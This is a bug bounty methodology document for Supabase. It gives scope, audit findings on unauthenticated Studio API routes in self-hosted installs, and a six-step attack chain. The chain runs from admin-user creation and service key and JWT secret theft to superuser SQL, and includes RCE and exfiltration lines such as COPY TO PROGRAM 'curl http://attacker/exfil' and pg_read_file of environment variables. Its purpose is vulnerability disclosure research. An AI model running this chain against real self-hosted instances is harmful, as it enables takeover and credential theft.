---
title: Supabase Bug Bounty Methodology
name: supabase-bug-bounty
description: Systematic approach to finding vulnerabilities in Supabase — open-source Firebase alternative built on Postgres. Covers MCP SSRF, source code audit (TypeScript/Node.js monorepo), web app IDOR/privilege escalation, and API fuzzing.
---

# Supabase Bug Bounty Methodology

Target: Supabase (hackerone.com/supabase)
Status: VDP (recognition-only; paid bounties planned for 2026 per supabase.com/blog)
Scope: 18 assets — web app (supabase.com), API (api.supabase.com), MCP (mcp.supabase.com/mcp), GitHub source (github.com/supabase), community repos, *.supabase.co (own projects only), *.database.dev
Response: ~2 days first response, ~3 days triage, ~3 weeks resolution
Safe Harbor: Gold Standard

## Key Rules

- **Email**: Use `@wearehackerone.com` for all accounts
- **Header**: Set `X-SUPABASE-VDP: {H1 HANDLE}` on all requests
- **No customer testing**: `*.supabase.co` is Supabase customers — test only your own projects
- **OOS**: SQLi on `api.supabase.com/platform/pg-meta/{id}/query` (intended), clickjacking, CSRF on non-sensitive forms, DoS, rate-limiting, automated tools without manual verification
- **AI reports**: Raw AI output without validation = N/A. Using AI to assist is fine.

## Attack Surface Map

| Asset | Type | What to Test |
|-------|------|-------------|
| supabase.com | Web app | Dashboard IDOR, auth bypass, RLS bypass, privilege escalation |
| api.supabase.com | API | SSRF, authz bypass, parameter tampering, rate limit bypass |
| github.com/supabase | Source code | Full TypeScript monorepo audit |
| mcp.supabase.com/mcp | MCP server | SSRF via fetch tools, prompt injection, tool auth bypass |
| github.com/supabase-community/supabase-mcp | MCP Source | Tool handler injection, GraphQL abuse |

## Fact-Check Confirmation (June 2026)

Every claim in the Supabase self-hosted auth bypass report (REPORT.md + ESCALATION.md → merged into SUBMISSION.md) was verified against actual source code:

| Claim | File:Line | Verdict |
|-------|-----------|---------|
| `IS_PLATFORM && withAuth` skips auth on self-hosted | `apiWrapper.ts:41` | CONFIRMED |
| `api-keys.ts` is a bare handler | `pages/api/v1/projects/[ref]/api-keys.ts:13` | CONFIRMED — no 4th arg, returns raw SERVICE_KEY |
| Settings leaks AUTH_JWT_SECRET | `pages/api/platform/projects/[ref]/settings.ts:14` | CONFIRMED |
| pg-meta query has `{ withAuth: true }` but auth skipped | `pages/api/platform/pg-meta/[ref]/query/index.ts:9` | CONFIRMED — IS_PLATFORM=false shorts check |
| pg-meta uses supabase_admin (superuser) | `lib/api/self-hosted/constants.ts:13` | CONFIRMED — default user |
| edge-functions/test is bare handler | `pages/api/edge-functions/test.ts:6` | CONFIRMED — no apiWrapper at all |
| Self-hosted SSRF regex accepts any host | `lib/api/edgeFunctions.ts:11-16` | CONFIRMED |
| kong:8000 is valid SSRF target | `lib/api/edgeFunctions.test.ts:17` | CONFIRMED — listed in test suite |
| Tests cover IS_PLATFORM=false? | `lib/api/apiWrappers.test.ts:10` | **GAP** — always mocks IS_PLATFORM:true |
| CVE exists for this bypass? | CVE database | **No CVE** |
| Fix merged? | `git log --grep=auth\|IS_PLATFORM\|middleware` | **NOT MERGED** |
| Fix branch? | `git branch -a` | **middleware-studio** (Feb 2026, no PR, stale 3.5 months) |
| H1 policy excludes pg-meta? | Policy CSV | pg-meta SQLi excluded — but this is AUTH BYPASS not SQLi |

**Key nuance**: pg-meta SQL execution is NOT a SQL injection. The service is designed to accept raw SQL. The vulnerability is the AUTHENTICATION BYPASS that exposes this functionality. The H1 policy excludes "SQLi on pg-meta" — auth bypass is a different class.

## Complete Attack Chain (6 Steps — All Auth-Free)

### Step 1: Create Admin User
```
POST /api/platform/auth/default/users
{"email":"attacker@evil.com","password":"Pwn3d!Supabase","email_confirm":true}
```
Calls supabase.auth.admin.createUser() with service_role key — no auth.

### Step 2: Extract SUPABASE_SERVICE_KEY (Bare Handler)
```
GET /api/v1/projects/default/api-keys
```
Returns raw SUPABASE_SERVICE_KEY + ANON_KEY. No apiWrapper at all.

### Step 3: Extract AUTH_JWT_SECRET
```
GET /api/platform/projects/default/settings
```
Returns process.env.AUTH_JWT_SECRET — forge arbitrary JWT tokens.

### Step 4: Arbitrary SQL via pg-meta (Auth Bypass)
```
POST /api/platform/pg-meta/default/query
{"query": "SELECT current_user, version()"}
```
Has withAuth:true but auth skipped on self-hosted. Default user supabase_admin (superuser). Escalation:
```sql
COPY (SELECT '') TO PROGRAM 'curl http://attacker/exfil';  -- RCE
SELECT pg_read_file('/proc/self/environ');                   -- env
CREATE EXTENSION plpython3u;                                  -- ext RCE
```

### Step 5: Internal Network SSRF
```
POST /api/edge-functions/test
{"url": "http://kong:8000/functions/v1/test"}
```
Bare handler, no auth. Probes internal services.

### Step 6: Full Compromise
SUPABASE_SERVICE_KEY + JWT secret + SQL RCE → shell on DB container → infrastructure pivot.

## Attack Vectors

### 1. MCP Server — Source Audit (supabase-mcp)

**Repo**: `github.com/supabase-community/supabase-mcp` (cloned at `~/Dev/supabase-mcp/`)
**Packages**:
- `mcp-server-supabase` — Main Supabase MCP server (TypeScript)
- `mcp-server-postgrest` — PostgREST MCP server
- `mcp-utils` — Shared utilities

**Key files for security review**:

| File | Purpose | Attack Vector |
|------|---------|---------------|
| `src/platform/api-platform.ts` | Management API operations | URL override via `apiUrl` option (runtime-controlled) |
| `src/content-api/graphql.ts` | GraphQL client to docs API | Fixed URL, no SSRF |
| `src/tools/database-operation-tools.ts` | SQL execution tools | SQL injection (intended — by design) |
| `src/tools/docs-tools.ts` | Docs search tool | GraphQL query injection (to fixed URL) |
| `src/management-api/index.ts` | HTTP client factory | Uses `openapi-fetch` — typed client |

**Known mitigations**:
- SQL results wrapped in `<untrusted-data-{uuid}>` to prevent prompt injection
- `apply_migration` intentionally omits results to avoid prompt injection
- All API URLs hardcoded at construction time (no runtime SSRF)
- Management API client uses `openapi-fetch` with typed paths (no path injection)

**Residual risk**: The `apiUrl` option in `SupabaseApiPlatformOptions` allows overriding the Management API URL at construction. A malicious host could point this to an attacker-controlled server. This is by design (BYO API) but worth noting.

### 2. Source Code Audit — Supabase Studio API

**Repo**: `github.com/supabase/supabase` (cloned at `~/Dev/supabase/`)
**Stack**: TypeScript monorepo (Next.js Pages Router + App Router, Postgres)
**Key directory**: `apps/studio/` — 3,679 TypeScript files

#### Auth Pattern — Critical to Understand

### The `apiWrapper` Anti-Pattern

API routes in Studio use `apiWrapper()` from `lib/api/apiWrapper.ts`:

```typescript
// lib/api/apiWrapper.ts — THE ROOT CAUSE
async function apiWrapper(req, res, handler, options?: { withAuth: boolean }) {
  const { withAuth } = options || {}
  if (IS_PLATFORM && withAuth) {       // BOTH must be true — auth only on hosted!
    const claims = await apiAuthenticate(req, res)
    if (!claims) return res.status(401).json({ error: 'Unauthorized' })
  }
  return handler(req, res)             // Handler always executes regardless
}
```

**Critical flaw**: `IS_PLATFORM && withAuth` means on self-hosted (`IS_PLATFORM = false`), auth is NEVER checked — even for endpoints that pass `{ withAuth: true }`.

### The Bare Handler Pattern (Worse)

Worse than `apiWrapper` without `withAuth` are endpoints that **don't use `apiWrapper` at all**:

```typescript
// pages/api/v1/projects/[ref]/api-keys.ts — BARE HANDLER, zero auth
const handleGetAll = async (_req, res) => {
  const response = [
    { name: 'anon', api_key: process.env.SUPABASE_ANON_KEY ?? '' },
    { name: 'service_role', api_key: process.env.SUPABASE_SERVICE_KEY ?? '' },
  ]
  return res.status(200).json(response)
}
export default handleGetAll  // No apiWrapper at all
```

**Search commands for finding bare handlers:**
```bash
# Find all bare handler exports (no apiWrapper wrapper)
grep -rn "export default" apps/studio/pages/api/ --include='*.ts' -A2 | grep -v apiWrapper

# Find ALL endpoints where auth was omitted
grep -rn "apiWrapper(req, res, handler)" apps/*/pages/api/ --include='*.ts'

# Cross-reference with SERVICE_KEY usage (critical combo)
grep -rn "SERVICE_KEY" apps/*/pages/api/ --include='*.ts'
```

```typescript
// WITH auth (safe):
apiWrapper(req, res, handler, { withAuth: true })

// WITHOUT auth (potential vuln):
apiWrapper(req, res, handler)
```

When `withAuth: true`, the wrapper calls `apiAuthenticate()` which validates the JWT from the `Authorization` header. **Without it, no auth check runs.** On the hosted platform (`api.supabase.com`), the proxy layer (`proxy.ts`) blocks most endpoints that lack auth — but self-hosted installations are wide open.

#### Proxy Layer — Hosted vs Self-Hosted

File: `apps/studio/proxy.ts`

On the hosted platform (`IS_PLATFORM &&`), only these API paths are allowed:
```
/ai/sql/generate-v4, /ai/sql/policy, /ai/feedback/rate, /ai/code/complete,
/ai/sql/cron-v2, /ai/sql/title-v2, /ai/sql/filter-v1, /ai/onboarding/design,
/ai/feedback/classify, /ai/docs, /ai/sql/parse-client-code, /get-ip-address,
/get-utc-time, /get-deployment-commit, /check-cname, /edge-functions/test,
/generate-attachment-url, /incident-status, /incident-banner, /parse-query,
/api/integrations/stripe-sync, /content/graphql, /status-override
```

Everything else (`/api/platform/*`, `/api/auth/*`, etc.) returns 404 on hosted. Only the AI assistant and utility endpoints are exposed. **On self-hosted, all endpoints are accessible.**

#### Findings from Code Audit

**Finding A: `/api/check-cname` — Unauthenticated DNS SSRF Probe**
- File: `apps/studio/pages/api/check-cname.ts`
- `domain` param from `req.query` interpolated directly into fetch URL
- `fetch(\`https://cloudflare-dns.com/dns-query?name=${domain}&type=CNAME\`)`
- **No URL encoding** on domain — potential query param injection via `#` or `&`
- **No auth** — `apiWrapper` not used at all
- On hosted: allowed through proxy
- Impact: DNS rebinding probe, internal service discovery, SSRF via Cloudflare DNS resolver

**Finding B: `/api/edge-functions/test` — SSRF via Edge Function URL**
- File: `apps/studio/pages/api/edge-functions/test.ts`
- Accepts `url` from POST body, calls `fetch(url, ...)` with user-controlled headers/body
- **No auth** — handler exported directly without `apiWrapper`
- URL validation via `isValidEdgeFunctionURL()`:
  - On platform: restricted to `https://[20-char].supabase.co|red/functions/v[1-9]/...`
  - On self-hosted: `^https?://[^\s/?#]+/functions/v[0-9]{1}/.*$` — very permissive
- Impact (self-hosted): Full SSRF to any service with `/functions/v1/...` in path
- Impact (platform): Limited to edge function URLs on supabase.co domain

**Finding C: `/api/platform/auth/[ref]/users/[id]` — Missing Auth on Admin Operations**
- File: `apps/studio/pages/api/platform/auth/[ref]/users/[id]/index.ts`
- PATCH: bans a user via `supabase.auth.admin.updateUserById(id, { ban_duration })`
- DELETE: deletes a user via `supabase.auth.admin.deleteUser(id)`
- Uses `SUPABASE_SERVICE_KEY` (privileged admin key)
- **`apiWrapper` called WITHOUT `{ withAuth: true }`** — no JWT validation
- On hosted: blocked by proxy (returns 404)
- Impact: Admin-level user deletion/banning without auth on self-hosted

**Finding D: `/api/platform/projects/[ref]/api/rest.ts` — Service Key Exposure**
- File: `apps/studio/pages/api/platform/projects/[ref]/api/rest.ts`
- Fetches from `SUPABASE_URL/rest/v1/` using `SUPABASE_SERVICE_KEY`
- No `withAuth: true` (read-only GET/HEAD only, but service key is transmitted)

See `references/supabase-studio-api-audit.md` for full endpoint-by-endpoint analysis.

#### Priority Audit Areas (Next Session)
- Auth endpoints (email/password, GitHub OAuth, SSO)
- Row Level Security (RLS) bypass
- Storage API — path traversal in file uploads
- Edge Functions — code execution sandbox
- API key handling — leakage in logs, headers, URLs
- Realtime subscriptions — WebSocket auth bypass
- `pg-meta` — schema introspection endpoints
- AI SQL endpoint (`connectionString` injection in generate-v4.ts)

### 3. Web App / API — Live Testing

**Base URLs**: `https://supabase.com`, `https://api.supabase.com`

**Auth**: Email/password with `@wearehackerone.com` + GitHub OAuth option

**Test plan**:
1. Create account (GitHub OAuth preferred for faster setup)
2. Generate Management API token (`SUPABASE_ACCESS_TOKEN`)
3. Create test project (free tier)
4. Test for IDOR by manipulating project IDs in API calls
5. Test RLS bypass by sending unauthenticated requests to data APIs
6. Storage path traversal via file upload edge cases
7. Edge Function sandbox escape

## Known CVEs & Research

| Vulnerability | Reference | Notes |
|---------------|-----------|-------|
| SQL injection on pg-meta query endpoint | Intended (OOS in scope) | Explicitly excluded from rewards |
| SSRF via redirect in edge function fetch | General class | Check if supabase-mcp has redirect handling |

## Report Structure

```
~/Dev/REPORTS/Supabase/<SubmissionNumber>/<finding-name>/
├── REPORT.md
└── poc/
    ├── poc-*.js/py
```

## Source Code Locations

- Supabase MCP: `~/Dev/supabase-mcp/` (cloned from github.com/supabase-community/supabase-mcp)
- Supabase monorepo: `~/Dev/supabase/` (cloning from github.com/supabase/supabase)

See `references/supabase-mcp-audit.md` for the MCP server code-level audit (tool analysis, prompt injection protections, SSRF vector analysis).
See `references/supabase-escalation-patterns.md` for post-exploitation escalation chains (service key leak, SQL→RCE, SSRF chaining, and complete attack path).
